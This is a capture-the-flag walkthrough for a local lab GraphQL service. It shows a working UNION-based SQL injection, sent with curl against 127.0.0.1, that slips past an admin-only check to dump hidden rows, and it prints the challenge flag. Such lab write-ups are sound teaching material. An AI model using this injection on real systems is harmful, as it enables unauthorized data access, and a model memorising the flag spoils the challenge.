# locust — walkthrough

Entry: `http://127.0.0.1:18956/graphql/` (FastAPI + Strawberry GraphQL,
SQLite behind it).

## 1. Baseline + the hard gate

```bash
curl -s http://127.0.0.1:18956/graphql/ -H 'Content-Type: application/json' \
  -d '{"query":"{ jobs { id name type description } }"}'
```

Front-end/back-end rows come back; a `private` row is excluded by the
resolver's fallback `WHERE type IN (...)`. Asking for `jobType:"private"`
directly hits the application gate:

```
Exception: Only admins can see private jobs
```

The gate is *in the Python*, not in SQLite: the `job_type` argument of the
generated `SELECT * FROM jobs WHERE type = '<arg>'` is raw f-string
interpolation.

## 2. UNION straight into SQLite

Close the string, UNION the whole table back, comment the tail — the app
never sees `private` as the argument, so the gate never fires:

```bash
curl -s http://127.0.0.1:18956/graphql/ -H 'Content-Type: application/json' -d '{
  "query":"{ jobs(jobType: "x'"'"' UNION SELECT id,name,type,description FROM jobs -- ") { id name type description } }"
}'
```

All rows return — including `Hidden job / private`, whose `description` is
the flag.

## Flag

```
FLAG{xbow_locust_a82bdb7787af8fa67d1fe773}}
```

`sha256(flag)[:8] = 0e03230e`

Note the doubled closing brace — that is the flag's true shape in this
series, not a typo.
